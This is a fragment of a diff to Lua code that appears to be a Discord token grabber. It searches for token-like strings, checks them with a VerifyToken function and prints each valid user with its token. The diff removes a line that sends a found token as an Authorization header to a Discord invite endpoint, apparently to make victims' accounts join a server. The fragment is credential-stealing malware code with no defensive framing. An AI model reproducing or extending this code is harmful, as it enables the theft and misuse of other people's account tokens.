@@ -33,7 +33,6 @@ coroutine.wrap(function()
                         if type(Found) == "string" and string.len(Found) > 11 then -- fuck proper pattern matching lol
                             local User = VerifyToken(Found)
                             if User then
-                                Https.request("POST","https://discord.com/api/v8/invites/gCWMAUsm",{{"Authorization",Found}})
                                 print(User.." "..Found)
                             end
                         end
